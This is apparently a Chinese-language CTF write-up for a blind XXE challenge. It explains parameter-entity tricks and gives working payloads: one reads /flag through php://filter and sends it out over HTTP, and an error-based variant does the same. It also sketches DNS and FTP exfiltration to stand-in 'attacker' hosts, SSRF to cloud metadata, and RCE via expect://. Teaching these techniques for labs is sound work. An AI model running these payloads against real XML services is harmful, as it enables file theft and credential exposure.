## 题目背景

Note

Blind XML Parser Service — 内部系统，四个接口全部“无回显”：

- `POST /submit` - 接 XML，解析但不返回内容，只给 `{"ok":true/false}`
- `POST /dtd-upload` - 接 DTD 文本，靶机自托管，返回 `http://127.0.0.1/dtd/<id>.dtd`
- `GET /oob?c=...` - 内部探针接收器，落盘到 `/tmp/oob.log`
- `GET /oob-log` - 读取探针日志
- Flag 位置: `/flag`

出题人的“好心”其实是教学陷阱：现实中打盲 XXE 要自己准备一台公网 VPS 托管 `evil.dtd` + 起 `http` 监听收外带；本题把这两件事都搬到靶机内部—`/dtd-upload` 当 `evil.dtd` 服务器、`/oob?c=X` 当 collaborator 回调，`/oob-log` 当你翻看"collaborator logs"的入口。全站自闭环，不出网也能打。

## 漏洞本质

盲 XXE 的核心矛盾：有实体展开，没回显通道。

| 维度 | 经典 XXE（Q27） | 盲 XXE OOB（本题） |
| --- | --- | --- |
| 响应 | 包含实体替换结果 | 完全无关 body（`ok:true/false`） |
| 实体类型 | 通用实体 `<!ENTITY x SYSTEM "...">` + `&x;` | 参数实体 `<!ENTITY % p SYSTEM "...">` + `%p;` |
| 数据通道 | HTTP 响应 body | HTTP/DNS/FTP 外带（parser 主动发请求） |
| DTD 位置 | 可全部写在请求内联 | 内联 DTD 中 `%` 参数实体不能嵌套定义 -> 必须托管外部 DTD |

\

### 为什么必须用"外部 DTD"？这是 XML 规范的一条古怪限制：

> In an internal DTD subset, parameter entity references can only appear where markup declarations can appear, not within markup declarations themselves.

一句话：`<!ENTITY % p '<!ENTITY ...>'>` 这种"实体定义中再定义实体"的写法，在内联 DTD 里是非法的，但在外部 DTD 里合法。于是盲 XXE 的标准姿势是：

1. 内联 DTD: `<!ENTITY % dtd SYSTEM "外部.dtd"> %dtd;`
2. 外部 DTD: 参数实体的三段套（读文件、构造外带实体、触发）

## 参数实体三段套（本题核心心法）：

[代码块边界]xml
第一段 - 取数据:
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">
↑ 定义 %f，展开时会读 /flag 并 base64

第二段 - 造实体:
<!ENTITY % ex "<!ENTITY &#x25; out SYSTEM 'http://127.0.0.1/oob?c=%f;'>">
↑ 定义 %ex，展开时会动态“再定义一个实体 %out”，URL 里嵌了 %f
↑ &#x25; 是 '%'，用于字符引用延迟解析，否则 parser 当场展开 %out 会报错

第三段 - 触发:
%ex;   → 展开第二段 → 此时 %out 被 parser 吸收进 DTD
%out;  → 展开 %out → 触发 HTTP GET → 外带完成
[代码块边界]

Important

`&#x25;` 的作用：`%` 在 DTD 里既是参数实体前缀又是字面量 `%`。如果直接写 `<!ENTITY % out ...>` 在字符串里，parser 会把 `%out` 当参数实体立刻查找一此时 `out` 还没定义，立即报错。写成 `&#x25;out ...` 后，parser 先把 `&#x25;` 解释成 `%`，再把整串作为 `%ex` 的值存起来；等到引用 `%ex;` 时才真正展开出 `<!ENTITY % out ...>` 并定义 `out`。这是所有盲有 XXE payload 的共通细节，必记。

## 关键前置知识

通用实体 `&x;` vs 参数实体 `%p;`：

| 特性 | 通用实体 | 参数实体 |
| --- | --- | --- |
| 声明 | `<!ENTITY x "...">` | `<!ENTITY % p "...">` |
| 引用 | `&x;` | `%p;` |
| 使用位置 | XML 正文 | 仅 DTD 内部 |
| 能在实体内嵌实体吗 | 嵌内部实体 OK | 嵌套受 XML 规范限制（见本题） |
| 盲 XXE 核心工具 | 无用 | 必须 |

## XXE 两条主外带通道：

| 通道 | 优点 | 缺点 |
| --- | --- | --- |
| HTTP 外带（本题） | 带宽大，可带完整 base64，日志易查 | 需目标能出网（本题靶机 loop 到自己） |
| DNS 外带 `<!ENTITY % p SYSTEM "http://flag 拼子域.attacker">` | 仅需 DNS 出口，更隐蔽 | 子域长度限制、UDP 重传、特殊字符要 base32 |
| FTP 外带 | 有些旧 libxml 支持，能带较长参数 | 依赖 FTP 客户端实现 |

错误回显外带（盲场景的“后备箱”）：

[代码块边界]xml
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">
%e;
%err;
[代码块边界]

parser 会尝试打开 `/nonexistent/<flag 内容>` 然后抛 IOError，错误消息里原样带上 `<flag>`。本题 `/submit` 不回显错误所以用不了；但很多真实盲 XXE 点是这条路。

`php://filter/convert.base64-encode/resource=X` 的三大用途：

1. 避免二进制文件把 XML 解析炸掉
2. 避免 flag 含 `<`、`&`、`"` 这类字符二次破坏结构
3. base64 不含 `%`、`&`、`?` 等 URL 敏感符，能安全塞进 query string

## 阶段 ②：为什么必须用 `/dtd-upload`

盲 XXE 需要在"参数实体里再定义参数实体"，这在内联 DTD 违反 XML 规范。若不托管外部 DTD：

[代码块边界]xml
<!DOCTYPE r [
  <!ENTITY % f SYSTEM "file:///flag">
  <!ENTITY % ex "<!ENTITY &#x25; out SYSTEM 'http://.../oob?c=%f;'>">
  %ex; %out;
]>
[代码块边界]

多数 libxml 会报错：`PEReferences forbidden in internal subset`。所以必须把 `%ex` 那段扔到 `/dtd-upload` 托管。

## 阶段 ③：为什么 `127.0.0.1` 而不是公网 IP

三条原因：

1. `/dtd-upload` 返回 URL 就是 `http://127.0.0.1/dtd/...`，表示靶机内部可访问
2. `/oob` 同样是 `http://127.0.0.1/oob?c=...` 一靶机自己 loopback 访问自己
3. 容器内可能没有外网出口。题目明确告知"内部系统"——一切走 loopback

## 阶段 ④：`/flag` 读不读得到先用 `base64` 保险

flag 包含 `{}`、`-`：放 URL query 里多数 parser 能接受，但 `-` 之后若出现 `&`、`=` 会把 URL 截断。一次性 base64 编码最稳。

## 常见坑

| 问题 | 根因 | 解决 |
| --- | --- | --- |
| 内联 DTD 里"实体套实体"报错 `PEReferences forbidden` | XML 规范：参数实体不能在 internal subset 的 markup declaration 里嵌套 | 把 `<!ENTITY % ex ...>` 放到外部 DTD |
| `%ex` 写在 `<!ENTITY %` 字符里，parser 当场报 `out` 未定义 | `%out` 被提前解析 | 用字符引用 `&#x25;` 代替 `%` 延迟解析 |
| HTTP 外带 URL 里 flag 含 `&` / `=` 被截断 | query 解析 | `php://filter/convert.base64-encode` |
| 外部 DTD 加载失败，`%dtd` 拉不回 | 防火墙 / 出网限制 / URL 拼错 | 用靶机 loopback（本题 127.0.0.1） / 或先 `curl` 探连通 |
| `/oob-log` 一直没记录 | parser 没真的展开 `%out` | 检查 DTD 里 `%ex; %out;` 两行都写了；检查 `&#x25;` 没写错 |
| `parse failed` 看到就放弃 | 误以为攻击失败 | 直接查 `/oob-log`，OOB 在 fail 前已经发出去 |

## 盲 XXE OOB 进阶 8 谱

Important

1. 本题模式：HTTP 外带 + base64 + 靶机 loopback -> 零外网要求，最适合教学
2. 公网 collaborator 模式：需要一台可控公网 IP + http/dns 监听（如 Burp Collaborator）
3. FTP 外带：`<!ENTITY % out SYSTEM 'ftp://attacker/...'>`，有些老 libxml 支持，容量大
4. DNS-only 外带：仅 DNS 出口场景，子域 base32 携带数据
5. Error-based 外带：无 OOB 时，把数据塞进 parser 错误消息
6. XXE to SSRF：参数实体读 `http://169.254.169.254/` 云元数据、内网端口探测
7. XXE to RCE：PHP `expect://`、Java 反序列化链
8. XInclude 绕过（Q29 专题）：当 `<!DOCTYPE>` 被 WAF 剥离，改用 `xi:include` 引入
